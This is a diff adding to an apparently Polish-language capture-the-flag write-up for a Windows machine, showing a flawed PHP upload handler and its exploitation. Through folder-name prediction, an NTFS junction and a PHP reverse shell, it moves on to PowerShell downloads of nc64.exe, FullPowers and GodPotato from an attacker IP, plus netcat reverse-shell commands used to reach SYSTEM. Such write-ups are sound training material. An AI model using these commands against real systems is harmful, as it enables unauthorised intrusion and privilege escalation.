@@ -205,4 +205,143 @@ nasz user ma flagę i do tego nie ma innych userów więc prosto do admina droga
 
 ![{68D77638-7F64-4C3C-A139-7DD9128BCA66}](https://github.com/user-attachments/assets/9d4d0622-00aa-45ca-832b-c3d8d1ed54e2)
 
+![{A5312522-C059-48AF-83CF-E8F12451527A}](https://github.com/user-attachments/assets/e1a5804f-b135-4fb5-b8cf-f068aff0793d)
 
+chyba mamy eskalację.
+
+```
+<?php
+error_reporting(0);
+
+    // Your PHP code for handling form submission and file upload goes here.
+    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory
+
+    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
+        $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
+        $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
+        $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);
+
+        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
+        $folderName = md5($firstname . $lastname . $email);
+
+        // Create the full upload directory path
+        $targetDir = $uploadDir . $folderName . '/';
+
+        // Ensure the directory exists; create it if not
+        if (!file_exists($targetDir)) {
+            mkdir($targetDir, 0777, true);
+        }
+
+        // Sanitize the filename to remove unsafe characters
+        $originalFilename = $_FILES["fileToUpload"]["name"];
+        $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);
+
+
+        // Build the full path to the target file
+        $targetFile = $targetDir . $sanitizedFilename;
+
+        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
+            echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";
+
+            // Update the todo.txt file
+            $todoFile = $uploadDir . 'todo.txt';
+            $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";
+
+            // Append the new line to the file
+            file_put_contents($todoFile, $todoContent, FILE_APPEND);
+        } else {
+            echo "<script>alert('Uh oh, something went wrong... Please submit again');</script>";
+        }
+    }
+    ?>
+```
+(wkleiłem samoego php, bo nie ma seensu htmla wrzucać)
+
+### Analiza
+Z tego co rozumiem to na podstawie tego jak tworzony jest folder możemy "przewidzieć" jego nazwę, stworzyć taki folder i tak wrzucić jakiegoś revshella php.
+- nieeeee to można mądrzej zrobić.
+
+tworzymy sobie nowy folder, którego nazwę poznamy. Usuywamy go, wrzucamy junction i wrzucamy php
+
+najpier przygotowanie sobie revshella
+```
+cp /usr/share/webshells/php/php-reverse-shell.php .
+nano php-reverse-shell.php
+mv php-reverse-shell.php a.php
+```
+
+![{CB71A1C7-2578-4D33-92BE-7F7C43C99CC4}](https://github.com/user-attachments/assets/17894c58-79cd-40e2-8469-c405244f846a)
+
+![{6E5FA20F-0286-47DA-81AA-29353DDCFBC6}](https://github.com/user-attachments/assets/8cba3785-d146-44d1-a578-88858a1b13a9)
+
+![{F37A696D-B714-40D1-AC08-A6A108FE007A}](https://github.com/user-attachments/assets/5bec59ce-004d-4058-9bae-f4c968f25391)
+
+![{C565BC88-B83D-4E54-A351-486120F49D9A}](https://github.com/user-attachments/assets/66ecf807-bd23-4d46-adb5-7a278ab3cd02)
+
+```
+mklink /J C:\Windows\Tasks\Uploads\a8f7bab867e6d8f1c1fbdb698dfc9c38 C:\xampp\htdocs
+```
+
+![{FB79211F-1642-4D70-8480-219DF146CBCA}](https://github.com/user-attachments/assets/dd86ba3a-7af1-40b4-9971-77675c0b0cd4)
+
+![{6198A303-6207-48C9-BBE4-0C07CC3B5DD0}](https://github.com/user-attachments/assets/2fee649e-83e1-4232-84fd-dd81b08d9f68)
+
+i wysyłamy ponownie
+
+![{17098B60-B506-4347-AD71-39778DA6AC9E}](https://github.com/user-attachments/assets/d42c6620-39fa-41e9-aa11-ba1ef67cd6c7)
+
+![{F7740381-4436-42E6-AEB6-7F43A55365C5}](https://github.com/user-attachments/assets/34d3b5e1-4973-4180-89f7-d0b081fac445)
+
+![{198F826A-4048-4A46-BCE5-8A736C00DC2B}](https://github.com/user-attachments/assets/f6a5f8d2-acdb-449a-b8c0-9ac4f2570f31)
+
+ech... to jest windows przecież xDDD
+
+![{F0ECD6F0-4422-4DB5-BCF7-C390A1F1EDEA}](https://github.com/user-attachments/assets/b57016b0-3ec9-4c7f-9059-289a7ceaae3e)
+
+szybka podmiana
+
+![{2247939B-7D83-4D7C-968B-BB1A86651897}](https://github.com/user-attachments/assets/b840719b-0b75-4872-bbe4-3e8bb8d0435e)
+
+dobra działa
+
+```
+IWR -Uri "http://10.8.4.124/nc64.exe" -OutFile "C:\temp\nc64.exe" -UseBasicParsing
+```
+
+![{40EBD8B8-358B-49FB-A56C-BE7F3C11A238}](https://github.com/user-attachments/assets/9fdbfac5-3069-41a2-a108-6a058421eeee)
+
+![{1A0915C1-BC4E-4C61-971A-B9DAF581B5BD}](https://github.com/user-attachments/assets/90e723fb-6fd9-48a9-b85c-922e52ba1187)
+
+![{90135B12-CF21-4894-B5C0-0CBE2A51F613}](https://github.com/user-attachments/assets/d9e41416-66cc-4539-b0a7-e7ed5ec9a959)
+
+szczerze to myślałem, że konto serwisowe będzie of ręki do eskalacji jakimś ziemniakiem... coś tutja nie gra. Dla testu załaduję to `https://github.com/itm4n/FullPowers`.
+
+```
+IWR -Uri "http://10.8.4.124/FullPowers.exe" -OutFile "C:\temp\FullPowers.exe" -UseBasicParsing
+```
+
+![{7B5AD0C6-5FEF-4C3B-A4FA-FB70B03A344C}](https://github.com/user-attachments/assets/fad787ab-be3a-44d6-8ac3-4229f12a655c)
+
+```
+. .\FullPowers.exe -c "C:\temp\nc64.exe 10.8.4.124 443 -e cmd" -z
+```
+
+![{B0CD082C-9B0F-4C48-BA7D-FBD7633F4130}](https://github.com/user-attachments/assets/5e54c300-8a66-417b-9713-de663660f6bb)
+
+![{F116B346-FF7A-47C2-8B0D-69AABD3107F0}](https://github.com/user-attachments/assets/94b342cb-2df2-4213-8454-37094df2e3f3)
+
+no i teraz się zgadza :D
+
+```
+IWR -Uri "http://10.8.4.124/GodPotato-NET4.exe" -OutFile "C:\temp\GodPotato-NET4.exe" -UseBasicParsing
+. .\GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc64.exe 10.8.4.124 9001 -e cmd"
+```
+
+![{7F30E75B-C47B-404B-A0EA-D233A8C35A5F}](https://github.com/user-attachments/assets/b3a24716-7634-483d-8d7d-306adf3a727c)
+
+![{18DD4C23-AEBA-476F-B94F-18EF7D9349DC}](https://github.com/user-attachments/assets/1be1c59b-7428-490b-8758-9c5ede03d87e)
+
+![{1E064D4A-B2D8-4E17-8AB3-EC46584876CA}](https://github.com/user-attachments/assets/09c0aca5-4497-44ad-a450-a71951425315)
+
+
+FINISH
